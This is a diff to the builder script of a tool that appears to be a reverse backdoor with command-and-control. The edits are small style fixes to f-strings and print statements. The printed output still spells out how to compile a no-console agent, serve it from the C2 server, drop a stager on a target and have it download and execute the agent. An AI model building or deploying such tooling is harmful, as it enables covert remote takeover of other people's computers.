@@ -109,7 +109,8 @@ def client(host, port, reconnect, encryption, tls, http, front_host):
 
     click.secho('[+] Agent connecting...', fg='yellow')
     click.secho(f'    Target: {host}:{port}', fg='cyan')
-    click.secho(f'    HTTP: {\"ON\" if http else \"OFF\"}', fg='cyan')
+    http_status = 'ON' if http else 'OFF'
+    click.secho(f'    HTTP: {http_status}', fg='cyan')
     if front_host:
         click.secho(f'    Front host: {front_host}', fg='cyan')
 
@@ -159,9 +160,9 @@ REVERSE_BACKDOOR_ENCRYPTION={'true' if encryption else 'false'}
     click.secho('[>] To compile:', fg='yellow', bold=True)
     click.echo('  pip install pyinstaller')
     if target_os == 'windows':
-        click.echo(f'  pyinstaller --onefile --noconsole client/client.py')
+        click.echo('  pyinstaller --onefile --noconsole client/client.py')
     else:
-        click.echo(f'  pyinstaller --onefile client/client.py')
+        click.echo('  pyinstaller --onefile client/client.py')
 
 
 def _generate_stager(target_os, host, port, output, http):
@@ -206,10 +207,10 @@ def _generate_stager(target_os, host, port, output, http):
     click.secho(f'[+] Stager built: {out} ({size:,} bytes)', fg='green', bold=True)
     click.echo()
     click.secho('[>] Deploy:', fg='yellow')
-    click.echo(f'  1. Compile Python agent:   pyinstaller --onefile client/client.py')
-    click.echo(f'  2. Start C2 with payload:  python3 cli.py server --http --stage dist/client')
+    click.echo('  1. Compile Python agent:   pyinstaller --onefile client/client.py')
+    click.echo('  2. Start C2 with payload:  python3 cli.py server --http --stage dist/client')
     click.echo(f'  3. Drop stager on target:  {out}')
-    click.echo(f'  4. Stager downloads agent from C2 and executes')
+    click.echo('  4. Stager downloads agent from C2 and executes')
 
 
 if __name__ == '__main__':
